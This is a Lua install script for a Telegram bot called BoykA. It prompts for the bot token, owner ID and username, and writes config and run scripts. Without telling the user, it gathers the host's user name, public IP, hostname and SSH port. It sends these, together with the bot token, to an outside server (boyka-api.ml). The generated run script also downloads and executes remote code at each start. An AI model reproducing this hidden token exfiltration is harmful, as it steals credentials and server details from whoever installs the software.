database = dofile("./library/redis.lua").connect("127.0.0.1", 6379)
https = require ("ssl.https") 
serpent = dofile("./library/serpent.lua") 
json = dofile("./library/JSON.lua") 
JSON  = dofile("./library/dkjson.lua")
URL = require('socket.url')  
http = require("socket.http")
Server_Done = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
User = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
IP = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
Name = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
Port = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
Time = io.popen("date +'%Y/%m/%d %T'"):read('*a'):gsub('[\n\r]+', '')
local AutoFiles_Write = function() 
local Create_Info = function(Token,Sudo,user)  
local Write_Info_Sudo = io.open("Info.lua", 'w')
Write_Info_Sudo:write([[

token = "]]..Token..[["
SUDO = ]]..Sudo..[[  
UserName = "]]..user..[["

]])
Write_Info_Sudo:close()
end  
if not database:get(Server_Done.."Token_Write") then
print("\27[1;34m»» Send Your Token Bot :\27[m")
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
else
io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')


database:set(Server_Done.."Token_Write",token)
end 
else
io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
end 
os.execute('lua install.lua')
end


------------------------------------------------------------------------------------------------------------
----------------------------
if not database:get(Server_Done.."UserSudo_Write") then
print('\27[0;35m\n Send Id Sudo ↓ :\na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\27[0;33;49m')
local Id = io.read():gsub(' ','') 

io.write('\27[1;35m iD Sudo Saved \na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n27[0;39;49m')
database:set(Server_Done.."UserSudo_Write",Id)
end










if not database:get(Server_Done.."User_Write") then
print('\27[1;31m ↓ Send Your UserName Sudo :\n SEND user FOR SIDO : \27[0;39;49m')
local User = io.read():gsub('@','') 
if User ~= '' then
io.write('\n\27[1;34m Username Sudo Saved :\n\27[0;39;49m')
database:set(Server_Done.."User_Write",User)
else
io.write('\n\27[1;34m Username Not Save :')
end
os.execute('lua install.lua')
end
local function Files_Info_Get()
Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"),database:get(Server_Done.."User_Write")) 
http.request("https://boyka-api.ml/index.php?n=BOYKA-DeV&id="..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time)
local RunBot = io.open("BoykA", 'w')
RunBot:write([[
#!/usr/bin/env bash
cd $HOME/BoykA
token="]]..database:get(Server_Done.."Token_Write")..[["
rm -fr BoykA.lua
wget "https://raw.githubusercontent.com/TeleOniOn/BoykA/main/BoykA.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./BoykA.lua -p PROFILE --bot=$token
done
]])
RunBot:close()
local RunTs = io.open("Run", 'w')
RunTs:write([[
#!/usr/bin/env bash
cd $HOME/BoykA
while(true) do
rm -fr ../.telegram-cli
screen -S BoykA -X kill
screen -S BoykA ./BoykA
done
]])
RunTs:close()
end
Files_Info_Get()
database:del(Server_Done.."User_Write");database:del(Server_Done.."Token_Write");database:del(Server_Done.."UserSudo_Write")
sudos = dofile('Info.lua')
os.execute('./install.sh ok')
end 
local function Load_File()  
local f = io.open("./Info.lua", "r")  
if not f then   
AutoFiles_Write()  
var = true
else   
f:close()  
database:del(Server_Done.."User_Write");database:del(Server_Done.."Token_Write");database:del(Server_Done.."UserSudo_Write")
sudos = dofile('Info.lua')
os.execute('./install.sh ok')
var = false
end  
return var
end
Load_File()
